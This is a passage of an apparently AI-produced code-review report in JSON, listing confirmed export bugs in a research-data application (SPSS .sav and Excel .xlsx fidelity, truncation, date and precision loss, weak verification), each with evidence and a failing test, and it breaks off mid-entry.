+     "evidence": "Codebook text contains '\"missing_codes\": [{\"lo\": -Infinity, \"hi\": -1.0'. json.loads(text, parse_constant=<raise>) fails with 'non-standard JSON constant -Infinity'. Import→export of the cp1251 file wrote range bits ffeffffffffffffe/bff0000000000000 and 4056800000000000/7fefffffffffffff (correct).",
+     "file_line": "data_export.py:246-247; data_export.py:1497; export_bundle.py:551",
+     "confirmed": true,
+     "red_test": "def test_codebook_json_is_strict_json(self):\n    df = pd.DataFrame({'q1': [1.0, -3.0]})\n    book = de.build_codebook(df, 't', metadata={'q1': {'missing_codes': [['range', float('-inf'), -1.0]], 'source': 'sav'}})\n    text = json.dumps(book.to_dict(), ensure_ascii=False, indent=1)  # as export_csv / write_bundle do\n    json.loads(text, parse_constant=lambda c: (_ for _ in ()).throw(ValueError(c)))  # today raises"
+    },
+    {
+     "id": "SAV-10",
+     "severity": "minor",
+     "area": ".sav export size: no compression",
+     "claim": "write_sav never asks for row (bytecode) compression, so every row stores the full width of the widest text. One long answer inflates the file about 7×, and the program cannot re-open its own export once the file passes MAX_BYTES (150 MiB). SPSS writes compressed files by default.",
+     "evidence": "Width 32,000 gives 127 segments, 4,063 slots and 32,664 bytes per row. 5,000 rows would be 155.8 MiB, above the 150 MiB cap that _file_guard enforces. Measured on 500 rows (one 32,000-byte text plus 20 numerics): uncompressed 15.70 MiB versus 2.17 MiB with row_compress=True. The app's header compression field is 0.",
+     "file_line": "data_export.py:940-946; data_loader.py:35 and 138",
+     "confirmed": true,
+     "red_test": "def test_sav_is_bytecode_compressed(self):\n    df = pd.DataFrame({'comment': ['x' * 32000] + ['short'] * 499, **{f'n{k}': np.arange(500.0) for k in range(20)}})\n    path = self.folder / 'big.sav'; de.export_sav(path, df, de.build_codebook(df, 't'))\n    self.assertEqual(struct.unpack_from('<i', path.read_bytes(), 72)[0], 1)  # today 0 (15.7 MiB) -> FAILS"
+    },
+    {
+     "id": "SAV-11",
+     "severity": "minor",
+     "area": ".sav import: user-missing values on DATE variables",
+     "claim": "pyreadstat returns DATE variables as object columns of datetime.date. _load_sav treats such a column as text and matches missing codes with isinstance(v, str), so a declared user-missing date (e.g. 1900-01-01) is never masked. With the default 'missing, as SPSS treats them' option, the sentinel stays a real date and no warning is given. The code is stored as text '1900-01-01', and the next .sav export drops the declaration.",
+     "evidence": "Hand-built file: DATE11 variable with discrete missing 1900-01-01, values 1990-05-17, 1900-01-01, SYSMIS. pyreadstat with SPSS semantics gives [1990-05-17, nan, nan]. The app's default import gives [1990-05-17, 1900-01-01, nan] with warnings () and metadata missing_codes ['1900-01-01'].",
+     "file_line": "data_loader.py:673-689",
+     "confirmed": true,
+     "red_test": "def test_user_missing_date_is_missing_by_default(self):\n    path = self.folder / 'dob.sav'; path.write_bytes(minimal_sav_date_with_missing(date(1900, 1, 1), values=[date(1990, 5, 17), date(1900, 1, 1), None]))\n    frame, _ = load_dataset_with_report(path)\n    self.assertTrue(pd.isna(frame['dob'].iloc[1]))  # today date(1900,1,1) -> FAILS"
+    },
+    {
+     "id": "SAV-12",
+     "severity": "minor",
+     "area": ".sav export: infinities",
+     "claim": "±inf numbers are written into data cells as raw IEEE infinities, without a preview entry. SPSS has no infinity: invalid results are SYSMIS, and extreme values are bounded by HIGHEST/LOWEST. What SPSS shows for these cells is unverified. The .xlsx limitations say 'there are no infinities'.",
+     "evidence": "df x=[inf,-inf,1.5] gives data bytes 7ff0000000000000 and fff0000000000000 (not HIGHEST 7fefffffffffffff or SYSMIS); plan changes []. pyreadstat reads back inf/-inf.",
+     "file_line": "data_export.py:876-878",
+     "confirmed": false,
+     "red_test": "def test_infinities_are_listed_or_sysmis(self):\n    df = pd.DataFrame({'x': [float('inf'), float('-inf'), 1.5]}); plan = de.plan_sav(df, de.build_codebook(df, 't'))\n    self.assertTrue(any(name == 'x' for name, _, _ in plan.changes))  # today [] -> FAILS"
+    },
+    {
+     "id": "SAV-13",
+     "severity": "minor",
+     "area": ".sav verification",
+     "claim": "The 'independent re-read' for .sav uses pyreadstat, the same ReadStat library that wrote the file, and checks only the signature, names and row count. It cannot detect SAV-1, SAV-2, SAV-5 or SAV-6, and labels, values, missing values and measures are never compared, contrary to the module docstring.",
+     "evidence": "verify_sav returned OK for the SAV-1 file (A1 with missing 'N/A'), the SAV-2 file (short names 'Возр'/'возр') and the SAV-5 file (40,000-byte string, 159 segments). Module docstring data_export.py:31-33: 're-opened with an independent reader'.",
+     "file_line": "data_export.py:1367-1381",
+     "confirmed": true,
+     "red_test": "def test_verify_sav_rejects_width_violations(self):\n    df = pd.DataFrame({'smoker': ['Y', 'N']}); book = de.build_codebook(df, 't', metadata={'smoker': {'missing_codes': ['N/A']}})\n    path = self.folder / 'w.sav'; de.write_sav(path, df, book)\n    with self.assertRaises(de.VerificationFailed):\n        de.verify_sav(path, rows=2, names=['smoker'])  # today returns OK"
+    }
+   ],
+   "checked_and_fine": [
+    "Method (read-only constraint): no /tmp/verify-export-sav worktree or scratch files were created; the system's read-only rules forbid file creation. I imported from the existing worktree .claude/worktrees/agent-ab4c1a5c434f3d69a (HEAD 619143d, clean before and after, untracked files included). Every module used is byte-identical to the commit (git hash-object vs 619143d:<file>). Every .sav was written and read through anonymous in-memory files (memfd). The fixture was generated in memory from the generator's git blob and loaded through the app's own CSV loader, with only the disk read stubbed. The independent reader and writer are my own struct code. PSPP behaviour comes from its source (gnu-mirror-unofficial/pspp: sys-file-reader.c, missing-values.c, dictionary.c, identifier.c, val-type.h). The 18-minute suite was not run, because it writes files.",
+    "180-case fixture plus the test's 11 adversarial columns (109 variables): header $FL2, layout 2, nominal_case_size 110 equal to the slot count, compression 0, ncases 180, bias 100.0, subtype 16 = (1,180), subtype 3 = IEEE little-endian with character code 65001, subtype 4 = SYSMIS/HIGHEST/LOWEST, subtype 20 = 'UTF-8'. File label cut at 64 bytes.",
+    "Independent case-by-case decode of all 180×109 cells matches the DataFrame. Doubles are bit-exact (0.1+0.2, 1/3, x.234), NaN becomes SYSMIS, -0.0 is preserved. visit_date/visit_day are exact seconds since 1582-10-14 with DATETIME20.0/DATE11.0 formats, NaT becomes SYSMIS. Identifiers are A-strings with leading zeros ('000'). Formula texts are stored verbatim.",
+    "Variable labels are byte-exact, including the 'rating' label cut to exactly 256 bytes on a character boundary. The 157-byte value label is cut to 119 bytes on a character boundary and listed. Value labels are correct: numeric labels in type 3/4, short-string labels in type 3/4 padded to 8 bytes, long-string labels in subtype 21 keyed by long name and padded to the width. Measures in subtype 11 equal the confirmed levels (id→nominal, unknown→0), with count = 3 × segments, as PSPP checks.",
+    "Missing values: numeric discrete (≤3), range n=-2, range plus discrete n=-3. LO/HI ranges round-trip import→export with exact LOWEST/HIGHEST bits. String missing ≤8 bytes goes in the type-2 record for width ≤8 and in subtype 22 for width >8 (type-2 n_missing=0). '' is declared missing on text with missing values (documented). More than 3 codes are folded into a range only when no observed valid value falls inside (documented).",
+    "Very long strings: a 300-byte value is written as segments 255+48 with subtype 14 'ESSAY=00300'; 252-byte chunks reassemble exactly. A Cyrillic 120-character value gets width 240 (bytes), correct.",
+    "Names: a fuzz of 300 random sets (reserved words in any case, leading digit/_/#/$, trailing ./_, NBSP, combining marks, Latvian/Russian, >64 bytes, truncation collisions) produced long names that are always valid, at most 64 UTF-8 bytes and unique ignoring case. PSPP accepts any non-ASCII L/M/S/N character, so the app's stricter set is safe. Short names are always valid UTF-8 (ReadStat cuts on a character boundary). ReadStat's generated V1/V2… never collided with real columns V1/v2. Rename notes are ≤80 bytes and restore long LV/RU names, except SAV-8.",
+    "Other kinds: times are written as TIME8.0 with microseconds kept in the data. Int64 nullable becomes F8.0. Booleans become 0/1 with labels. Categoricals become codes with labels and are listed. int64 above 2^53 is listed. Timezone-aware datetimes are converted to UTC and listed. Mixed columns become text and are listed.",
+    "Import with my own writer: cp1257 with and without an encoding record, uncompressed and bytecode-compressed (codes 1–251, 253, 254, 255). cp1251 with a record (names without 0xFF). Very long strings are joined, subtype 21/22 are read, DATE11 becomes datetime.date and DATETIME20 a Timestamp. Labels, value labels, missing codes and measures come into the metadata. user_missing='missing' versus 'codes' behaves as documented for numeric and string variables. .zsav ($FL3) imports. The app's own export round trip restores the original names.",
+    "Designed and documented, not reported: a measure documented in the file becomes a suggestion only, so it is written as 'unknown' until confirmed; the default import replaces user-missing codes with missing (keeping the codes is an option); blank texts become missing on import; display widths are always 8 (cosmetic); variable roles are not written or read (no claim is made)."
+   ]
+  },
+  "xlsx": {
+   "findings": [
+    {
+     "id": "X1",
+     "severity": "major",
+     "area": "xlsx dates (1900 date system)",
+     "file_line": "data_export.py:1095-1105 (_CellWriter.__call__ hands naive datetime/date objects straight to openpyxl); data_export.py:1161-1209 (write_xlsx has no date-range check)",
+     "claim": "Dates and date-times before 1900-01-01 are silently corrupted in .xlsx. 1899-12-30 and 1899-12-31 both become serial 0, which openpyxl, pandas.read_excel and the program's own xlsx importer read back as datetime.time(0, 0), so the date is lost (1899-12-31 14:00 comes back as time(14, 0)). Earlier dates become negative serials (1895-03-12 -> -1754, 1800-01-01 -> -36522). Excel's 1900 date system cannot show those: it displays #####. Nothing is counted or warned, and verify_xlsx passes.",
+     "evidence": "Ran in memory (venv python, PYTHONDONTWRITEBYTECODE=1, sys.path on the clean claude/stage37-export checkout at 619143d, openpyxl temp files and all outputs in os.memfd_create files, independent reader zipfile+ElementTree). End to end: pyreadstat.write_sav of DATE11 values [1899-12-31, 1895-03-12, 1950-05-05], then data_loader._load_sav gives datetime.date objects, then de.write_xlsx. Raw sheet XML: A2 <v>0</v>, A3 <v>-1754</v>, A4 <v>18388</v>, all with the yyyy-mm-dd style. openpyxl read-back: [datetime.time(0, 0), datetime(1895,3,12), datetime(1950,5,5)]. Facts: cleaned=0, cut=0, text_numbers=0. pandas.read_excel(dtype=object), as data_loader.py:297 uses it, gives 1899-12-31 -> datetime.time(0, 0) and datetime 1899-12-31 14:00 -> datetime.time(14, 0). Refutation attempt: Jan-Feb 1900 is handled correctly (1900-01-01->1, 1900-02-28->59, 1900-03-01->61, Excel's fake 1900-02-29 = 60 is skipped). The CSV importer never makes date objects. But .sav import does (SPSS dates go back to 1582), so the path is reachable. docs §2.1 promises 'a spreadsheet date' without exception.",
+     "confirmed": true,
+     "red_test": "# tests/test_stage37_export.py, XlsxRoundTripTests\ndef test_dates_before_1900_survive_or_become_text(self):\n    from openpyxl import load_workbook\n    born = [dt.date(1899, 12, 31), dt.date(1899, 12, 30), dt.date(1895, 3, 12)]\n    df = pd.DataFrame({\"born\": pd.Series(born, dtype=object)})\n    path = self.folder / \"old.xlsx\"\n    de.export_xlsx(path, df, de.build_codebook(df, \"old\"), sections=(\"data\",))\n    ws = load_workbook(path)[\"Data\"]\n    for row, value in enumerate(born, start=2):\n        self.assertIn(ws.cell(row=row, column=1).value,\n                      (dt.datetime.combine(value, dt.time()), value.isoformat()))\n    with zipfile.ZipFile(path) as z:\n        serials = re.findall(r't=\"n\"><v>(-?[0-9.]+)</v>', z.read(\"xl/worksheets/sheet1.xml\").decode())\n    self.assertTrue(all(float(s) >= 1 for s in serials), serials)\n# today: row 2 is datetime.time(0, 0); serials ['0', '0', '-1754']"
+    },
+    {
+     "id": "X2",
+     "severity": "major",
+     "area": "xlsx 32,767-character limit and control characters: silent loss in the app and in the bundle",
+     "file_line": "data_export.py:1063-1072 (cut/cleaned only counted); workspace_export.py:423-444 (_announce ignores cut/cleaned/text_numbers); workspace_export.py:190-195 (notices only for .sav and .csv, none for .xlsx); export_bundle.py:532-534 (write_xlsx facts discarded); export_bundle.py:500 (static manifest note)",
+     "claim": "Text cells longer than 32,767 characters are cut. C0 control characters are replaced with U+FFFD. Infinities and integers above 2^53 become text. The counts are computed, but the researcher never sees them. The card has no pre-save preview for .xlsx (unlike _sav_notices). The success message only says 'Saved and checked … Re-opened with an independent reader: N rows, M variables'. The bundle throws away write_xlsx's facts, so manifest.json never records that data/<name>.xlsx differs from the CSV beside it. The Data card and docs call this default export 'a lossless copy of the data'.",
+     "evidence": "In memory: de.export_xlsx of a 40,026-character transcript, 'short\\x0bline' and 2**60 gives facts {'cleaned': 1, 'cut': 1, 'text_numbers': 1, 'verified': {'signature': 'xlsx (zip)', 'rows': 2, 'sheets': ['Data', 'Codebook']}}. The independent reader finds B2 at 32,767 characters (7,259 lost, the ' END' tail gone), B3 = 'short\\ufffdline' and C3 as text. The message built from workspace_text 'export.saved' is: 'Saved and checked: C:/Users/r/interviews.xlsx. Re-opened with an independent reader: 2 rows, 3 variables (xlsx (zip)).' Refutation attempt: the cut is mentioned only in the developer doc (docs §2.1/§10), not in any UI text (grep of workspace_text finds no cut/32,767 key for xlsx). The CSV importer has no per-cell length limit (only 150 MB / 5,000,000 cells), so long free text and transcripts are reachable.",
+     "confirmed": true,
+     "red_test": "# tests/test_stage37_export_ui.py, DataExportTests\ndef test_cut_or_replaced_cells_are_named_in_the_outcome(self):\n    self.ws.app.session.set_dataset(pd.DataFrame({\"pid\": [\"P1\", \"P2\"],\n        \"transcript\": [\"x\" * 40_000, \"a\\x0bb\"]}), \"interviews.csv\")\n    self.ws.click(\"nav-data\")\n    self.ws.click(\"export-save-data\")\n    feedback = \" \".join(texts(self.ws, \"export-feedback-data\"))\n    self.assertRegex(feedback, r\"32.?767|cut|replaced\")\n# plus in test_stage37_export.py: eb.write_bundle(path, df=df, codebook=de.build_codebook(df, 'd'), entries=[], app={'version': 't'});\n# manifest = json.loads(zipfile.ZipFile(path).read('manifest.json'));\n# self.assertTrue(any('32,767' in l or 'cut' in l for l in manifest['limitations']))\n# today: the feedback is only 'Saved and checked … 2 rows, 2 variables (xlsx (zip)).' and the manifest has no such limitation"
+    },
+    {
+     "id": "X3",
+     "severity": "minor",
+     "area": "xlsx numbers: 17-significant-digit doubles; Results 'unrounded' engine values",
+     "file_line": "export_bundle.py:261-265 (sheet heading 'Engine values (unrounded numbers, for your own tables)'); workspace_text.py:3318 (card: 'the engine's unrounded values', in EN/LV/RU); data_export.py:1094 and :1136 (floats handed to openpyxl); openpyxl/compat/strings.py:18 ('%.16g' % value); docs/STAGE37_EXPORT.md:13 ('lossless copy') and :118 ('at full precision')",
+     "claim": "openpyxl writes every float as '%.16g', so any double that needs 17 significant digits is silently rounded in the XML. On the Results sheets, about 40% of the engine values the card calls 'unrounded' are not the engine's numbers. In the Data sheet, values the program derives are not lossless either. Integer-valued float64 columns above 2^53 (for example IDs that became floats because of a missing value) are also written as rounded numbers. The int path writes such numbers as text.",
+     "evidence": "In memory: the six SYNTAX_ANALYSES of the test suite were run on the generator's 180-case fixture with run_method, then results_sheets and write_xlsx, then read back. 22 of 55 engine float values differ from the engine's double, for example R1 ci_low -0.41311334094973967 -> -0.4131133409497397, R2 adjusted_r_squared 0.11528408427616643 -> 0.1152840842761664, R2 coefficients[SYN_LON_TOTAL].b -0.39468303868947585 -> -0.3946830386894759. Data sheet: a Data->Prepare score_scale mean of the 12 SYN_SUP items has 69 of 180 values changed (3.9166666666666665 -> 3.916666666666667), and its z-score has 84 of 180 changed. 12345678901234568.0 is written as 1.234567890123457e+16, a different double. sys.float_info.max is written as 1.797693134862316e+308, which reads back as inf. Over 100,000 standard-normal doubles, 43,031 do not survive '%.16g'. Refutation attempt: docs §2.1 and §10 admit '16 digits', but the researcher-facing card text and the sheet heading say 'unrounded'. The existing test only compares R1 coefficient and p_value, which happen to fit in 16 digits. Fix: write repr(float) into <v> with the same data_type override _CellWriter.text already uses. Excel itself writes 17 digits.",
+     "confirmed": true,
+     "red_test": "# tests/test_stage37_export.py, ResultsAndBundleTests\ndef test_engine_values_are_unrounded(self):\n    from openpyxl import load_workbook\n    path = self.folder / \"unrounded.xlsx\"\n    facts = eb.export_results(path, self.session.results)\n    book = load_workbook(path)\n    for number, entry in enumerate(self.session.results, start=1):\n        sheet = book[facts[\"verified\"][\"sheets\"][number]]\n        shown = {r[0]: r[1] for r in sheet.iter_rows(values_only=True) if r and r[0]}\n        for name, value in eb.engine_values(entry.run.result):\n            if isinstance(value, float):\n                self.assertEqual(shown[name], value, (number, name))\n# today: R1 ci_low -0.4131133409497397 != -0.41311334094973967 (22 of 55 differ)"
+    },
+    {
+     "id": "X4",
+     "severity": "minor",
+     "area": "Results overview sheet names",
+     "file_line": "export_bundle.py:320 and :323 (overview stores f\"R{n} {title}\"[:31]) vs data_export.py:1109-1110 (_sheet_title replaces []:*?/\\ with _)",
+     "claim": "The Results overview's 'Sheet' column records the requested name, before _sheet_title cleans it. For any title containing / : ? * [ ] or \\, the overview names a sheet that does not exist. This affects 7 of the engine's 17 run titles.",
+     "evidence": "In memory, a real omnibus ANOVA run: workbook.xml sheet names are ['Results', 'R1 ANOVA _ Kruskal–Wallis'], but overview row 2, column 'Sheet', is 'R1 ANOVA / Kruskal–Wallis'. In the six-analysis set, R4 and R5 show the same mismatch. The affected engine titles in analysis_runs.py: 'ANOVA / Kruskal–Wallis', 'ANOVA / Kruskal–Wallis with post-hoc', 'ANCOVA / General Linear Model', 'Exploratory PCA / EFA', 'Scale quality: α, ω and item diagnostics', 'Descriptive: {variable}', 'Explore: {variable}'.",
+     "confirmed": true,
+     "red_test": "# tests/test_stage37_export.py, ResultsAndBundleTests\ndef test_the_overview_names_sheets_that_exist(self):\n    from openpyxl import load_workbook\n    path = self.folder / \"overview.xlsx\"\n    eb.export_results(path, self.session.results)\n    book = load_workbook(path)\n    named = {r[7] for r in book[\"Results\"].iter_rows(min_row=2, values_only=True)}\n    self.assertEqual(named - set(book.sheetnames), set())\n# today: {'R4 ANOVA / Kruskal–Wallis', 'R5 ANOVA / Kruskal–Wallis'}"
+    },
+    {
+     "id": "X5",
+     "severity": "minor",
+     "area": "illegal XML characters: crash instead of clean-up",
+     "file_line": "data_export.py:67 (_ILLEGAL_XML covers only \\x00-\\x08, \\x0b, \\x0c, \\x0e-\\x1f); data_export.py:1110 (_sheet_title does not clean control characters); data_loader.py:464 (headings only stripped at the ends)",
+     "claim": "XML 1.0 also forbids U+FFFE, U+FFFF and lone surrogates, but _ILLEGAL_XML does not catch them. When one appears in a text cell or a column name, lxml (in the runtime lock and used by openpyxl) raises, and the whole .xlsx export fails. So does the bundle, whose data .xlsx is mandatory. The same crash happens when a result sheet title contains a C0 control character, for example 'Descriptive: {variable}' where the variable name has an internal vertical tab from a pasted heading. The researcher is told to choose another folder or name. C0 controls in cells never raise IllegalCharacterError: they are replaced, see X2.",
+     "evidence": "In memory: de._ILLEGAL_XML.search(chr(0xFFFE)) is False, and the same for U+FFFF. export_xlsx of {'answer': ['ok', 'broken￾text']} raises ValueError, and workspace_files.explain turns it into 'data.xlsx could not be saved: All strings must be XML compatible: Unicode or ASCII, no NULL bytes or control characters. Choose another folder or name and try again.' write_xlsx([Sheet('R2 Descriptive: a\\x0bb', …)]) raises the same ValueError. A cell with 'lone \\udc80 surrogate' raises UnicodeEncodeError. The CSV export of the same data works. 'R1 Descriptive: a\\nb' is written with the newline in the sheet name. Refutation attempt: the importer rejects only NUL (data_loader.py:160), so these characters can reach the dataset. They are rare.",
+     "confirmed": true,
+     "red_test": "# tests/test_stage37_export.py, XlsxRoundTripTests\ndef test_characters_xml_cannot_hold_never_stop_an_export(self):\n    df = pd.DataFrame({\"t\": [\"a￾b\", \"c￿d\"]})\n    facts = de.export_xlsx(self.folder / \"c.xlsx\", df, de.build_codebook(df, \"d\"), sections=(\"data\",))\n    self.assertEqual(facts[\"cleaned\"], 2)\n    de.export_xlsx(self.folder / \"r.xlsx\", None, None, sections=(\"results\",),\n                   extra=[de.Sheet(\"R1 Descriptive: a\\x0bb\", [[(\"x\", \"text\")]])])\n# today: ValueError: All strings must be XML compatible: Unicode or ASCII, no NULL bytes or control characters"
+    },
+    {
+     "id": "X6",
+     "severity": "minor",
+     "area": "numbers vs text: identifiers with more than 15 digits",
+     "file_line": "data_export.py:1083-1088 (only |n| > 2^53 becomes text); data_export.py:1131-1136 (_float_cells); data_export.py:1161 (write_xlsx never sees the codebook levels)",
+     "claim": "A variable confirmed as identifier whose codes have 16 digits (10^15 <= |n| < 2^53) is written as numeric cells. The .sav export of the same variable writes a string variable (plan_sav: export.change.id_text). Excel keeps only 15 significant digits: such a cell shows 4.11111E+15, and editing it or saving the sheet as CSV from Excel loses the last digit (4111111111111111 becomes 4111111111111110 or '4.11111E+15').",
+     "evidence": "In memory: build_codebook(df, levels={'respondent': ('id', 'data', 'id')}) gives level 'id'. plan_sav gives [('respondent', 'export.change.id_text', {})] and SavColumn kind 'text'. The xlsx sheet XML has A2 t=\"n\" <v>4111111111111111</v> and A3 t=\"n\" <v>1234567890123456</v>; at 15 significant digits these are 4.11111111111111e+15 and 1.23456789012346e+15. Excel's documented number precision is 15 digits. Refutation attempt: the CSV/XLSX importer keeps columns named id, *_id, respondent and similar as text (data_loader.py:388, variable_rules.looks_like_identifier). That limits exposure to .sav imports, where numeric IDs stay float64 whatever their name, and to numeric ID columns with other names.",
+     "confirmed": true,
+     "red_test": "# tests/test_stage37_export.py, XlsxRoundTripTests\ndef test_identifiers_with_more_than_15_digits_are_text(self):\n    from openpyxl import load_workbook\n    df = pd.DataFrame({\"respondent\": [4111111111111111.0, 1234567890123456.0]})\n    book = de.build_codebook(df, \"d\", levels={\"respondent\": (\"id\", \"data\", \"id\")})\n    path = self.folder / \"ids.xlsx\"\n    de.export_xlsx(path, df, book, sections=(\"data\",))\n    cell = load_workbook(path)[\"Data\"][\"A2\"]\n    self.assertEqual((cell.data_type, cell.value), (\"s\", \"4111111111111111\"))\n# today: ('n', 4111111111111111)"
+    },
+    {
+     "id": "X7",
+     "severity": "minor",
+     "area": "row limit in the reproducibility bundle",
+     "file_line": "export_bundle.py:532-534 (data .xlsx written with no try/except) vs export_bundle.py:536-541 (.sav failure caught and reported); data_export.py:1168-1170",
+     "claim": "The bundle always writes data/<name>.xlsx and does not catch write_xlsx's ExportError. A table with more than 1,048,575 rows therefore gets no bundle at all, even though its CSV and .sav members could hold it. Such a table is importable when it has 4 columns or fewer under MAX_CELLS = 5,000,000. When the .sav member fails, the manifest records a limitation instead. The refusal text is English in the LV/RU interface.",
+     "evidence": "In memory: de.write_xlsx with a 1,048,576-row frame raises ExportError('1048576 rows do not fit in one worksheet (1,048,575 at most)') before writing anything. In write_bundle's produce(), that call at :532 has no try (only write_sav at :536-541 is wrapped), and save_atomic re-raises every exception (data_export.py:1410-1430). write_bundle itself was not executed here because it needs a temporary folder on disk. Reachability: data_loader.py:479 and :654 allow 1.1M rows x 4 columns, for example long-format reaction-time data.",
+     "confirmed": true,
+     "red_test": "# tests/test_stage37_export.py, ResultsAndBundleTests\ndef test_a_table_longer_than_a_worksheet_still_gets_its_bundle(self):\n    path = self.folder / \"long_bundle.zip\"\n    with mock.patch.object(de, \"XLSX_MAX_ROWS\", 100):\n        eb.write_bundle(path, df=self.session.df, codebook=self.book,\n                        entries=self.session.results, app={\"version\": \"test\"})\n    with zipfile.ZipFile(path) as z:\n        manifest = json.loads(z.read(\"manifest.json\"))\n    self.assertIn(\"data/synthetic_master_research_n180.csv\", {f[\"path\"] for f in manifest[\"files\"]})\n    self.assertTrue(any(\".xlsx\" in item for item in manifest[\"limitations\"]))\n# today: ExportError '180 rows do not fit in one worksheet (99 at most)'"
+    }
+   ],
+   "checked_and_fine": [
+    "How the review was run: I did not create /tmp/verify-export-xlsx or any scratch file, because this agent runs under a strict rule against creating files, so nothing needs removing. All code ran read-only from the existing clean checkout of claude/stage37-export (.claude/worktrees/agent-ab4c1a5c434f3d69a, HEAD 619143d = branch tip; git status clean; newest file 18:47 UTC, before this review). The venv python ran with PYTHONDONTWRITEBYTECODE=1. openpyxl's write-only temp files and every xlsx/csv/sav output went to anonymous memfd files. No file in /tmp, the venv or the worktree changed. The 18-minute full suite was not run, because it writes temp files.",
+    "Column limit (latent only): write_xlsx has no 16,384-column check. 16,385 columns are written with a cell XFE2 and verify_xlsx passes; 18,279 columns raise a raw ValueError 'Invalid column index 18279'. Both importers refuse datasets with more than 1,000 columns (data_loader.py:479 and :654), so the app cannot reach this.",
+    "Row limit for the standalone .xlsx: 1,048,575 data rows plus the header is the exact boundary. 1,048,576 rows are refused with ExportError before any byte is written (data_export.py:1168).",
+    "Numbers vs text: leading-zero codes ('001', '000'…) are inline-string text cells. Integers above 2^53 (2^53+1, -(2^53+1), 10^20, 2^60) are text with every digit; 2^53 itself is a number. ±inf become text 'inf'/'-inf', which Excel cannot store as numbers. NaN, None, NaT and pd.NA produce no cell. -0.0 is written as '-0'.",
+    "Booleans are written as t=\"b\" (1/0). A nullable boolean pd.NA produces no cell.",
+    "Empty vs missing: an empty text is written as <c t=\"inlineStr\"/> and a missing value has no cell, so the two stay distinct in the XML and in openpyxl's data_type, as docs §2.1 says. pandas.read_excel reads both as NaN, which the docs state only for CSV.",
+    "1900 leap-year region: 1900-01-01 -> 1, 1900-02-28 -> 59, 1900-03-01 -> 61, and datetime 1900-02-28 06:00 -> 59.25. These match Excel's serials (the fake 1900-02-29 = 60 is skipped). Only dates before 1900 are wrong (X1).",
+    "Time zones: tz-aware datetimes become ISO text with the correct per-value offset across DST (Europe/Riga +02:00/+03:00); tz-aware times become text. Naive times use the h:mm:ss format and read back as time. Durations become text. Microseconds are cut to milliseconds, which is Excel's own precision.",
+    "Text fidelity (independent ElementTree reader and openpyxl): \\r\\n, a lone \\r, tabs, leading, trailing and space-only texts (xml:space=preserve), NBSP, emoji, the C1 controls \\x7f and \\x85, and U+2028 all survive byte-exact. C0 controls in cells and headers become U+FFFD, with no IllegalCharacterError and no crash; that they are not reported is X2.",
+    "Formula safety: a full workbook (Data, Codebook, Scales, Results with 2 real analyses, Provenance) contains no <f> element. '=1+1', '+x', '-2+3' and '@SUM(A1)' are inline strings.",
+    "Full-workbook structure with the independent reader: sheet names are 31 characters or fewer, contain none of []:*?/\\, have no leading or trailing apostrophe and are unique ignoring case; every cell is within XFD1048576; every numeric <v> is finite; no text exceeds 32,767 UTF-16 units; verify_xlsx's sheet list equals workbook.xml.",
+    "Codebook sheet vs the codebook model: 0 cell mismatches over every variable and all 21 columns. For rating: 'Value labels' = '-9 = Refused; -8 = Do not know; 1 = Never; 2 = Rarely; 5 = Always', missing codes '-9; -8', valid values '1; 2; 5', counts valid 90 / missing 30 / user-missing 60. empty_or_missing counts 60 missing / 60 empty / 60 valid.",
+    "Scales and Codebook with a questionnaire and Data->Prepare history: questionnaire scale S lists reverse item i2; score S_mean lists items i1, i2_rev, i3 with reverse item i2_rev, rule 'mean; at least 2 of 3 answered'; 'Reverse-keyed variables: i2, i2_rev'. Likert anchors become value labels, mark_missing declares -9 on its source (n_user_missing 1), and the reverse, score and copy rules are written out.",
+    "Provenance: the dataset SHA-256 equals session.dataset_sha256(); Rows = 180; the per-result provenance rows are appended. Results sheet tables and verified estimates are display text by design and never parsed into numbers.",
+    "Sheet titles: results are named 'R<n> <title>' cut to 31 characters, then apostrophes are stripped, so no title starts or ends with one; the R<n> prefix keeps them unique; run titles are English engine titles, so LV/RU title length is not an issue. Only the overview mismatch (X4) and control characters (X5) remain.",
+    "CSV comma and semicolon layouts (write_csv in memory): numbers are unquoted with repr (0.30000000000000004 / 0,30000000000000004, 1,5e+20, 1,2345678901234568e+16, -0,0, inf); no thousands separators; integers above 2^53 keep exact digits; dates are quoted ISO text; texts are quoted, '\"\"' is an empty text, and = and - get the protective apostrophe. A BOM is present only when chosen (the bundle CSV has none). pandas.read_csv with decimal=',' returns every number and integer exactly.",
+    "verify_xlsx re-reads the file with openpyxl read-only (signature, sheet names, header, row count) and passes in every case above. It does not compare values, so X1 and X2 also pass verification."
+   ]
+  },
+  "integrity": {
+   "findings": [
+    {
+     "id": "F1",
+     "severity": "major",
+     "area": "xlsx/csv/sav verification and silent changes",
+     "claim": "The default 'lossless' .xlsx export silently changes cell content: XML control characters become U+FFFD, texts over 32,767 characters are cut, and int64 values above 2^53 become text. The counts are computed but never reach the researcher. Verification checks only signature, header and row count, so a write that changes content passes and the card says 'Saved and checked … Re-opened with an independent reader'. verify_csv and verify_sav likewise accept files in which every value is wrong.",
+     "evidence": "In-memory run of the branch's write_xlsx followed by verify_xlsx (memfd, no files). Input: answer=['Line one\\x0bline two (pasted from Word)', 'x'*40000, 'ok'], a header 'code\\x01', and an int64 2**60+1. Write facts: {'cleaned': 2, 'cut': 1, 'text_numbers': 1}. verify_xlsx passed with {'rows': 3, 'sheets': ['Data']}. The file holds 'Line one�lin…', 32,767 of the 40,000 characters, header 'code�', and counter '1152921504606846977' as str. The facts keys cleaned/cut/text_numbers are read nowhere outside data_export.py (git grep). workspace_export._announce (423-444) reports only rows, columns and signature. verify_xlsx compares the header after applying the same xlsx_text cleaning (data_export.py:1465), so it cannot see the change. Separately, verify_csv accepted a CSV with the right header and 3 records whose values were all 'ZZ'/0 ({'rows': 3}), and verify_sav accepted a .sav whose values all differ ({'rows': 3}). Writer and checker are the same libraries (openpyxl/openpyxl, ReadStat/ReadStat).",
+     "confirmed": true,
+     "file_line": "data_export.py:1054-1072 (_CellWriter.text), 1173-1174 and 1211-1213 (facts), 1313-1340 (verify_xlsx), 1465; workspace_export.py:423-444 (_announce)",
+     "red_test": "def test_xlsx_cells_changed_by_the_writer_are_caught_or_reported(self):\n    df = pd.DataFrame({'answer': ['Line one\\x0bline two', 'x' * 40000, 'ok']})\n    with tempfile.TemporaryDirectory() as folder:\n        facts = de.export_xlsx(Path(folder) / 'p.xlsx', df, de.build_codebook(df, 'p'))\n    # fails today: verification passes and the outcome never mentions the 2 altered cells\n    self.assertEqual(facts['verified'].get('changed_cells'), 2)"
+    },
+    {
+     "id": "F2",
+     "severity": "major",
+     "area": "R syntax in the bundle",
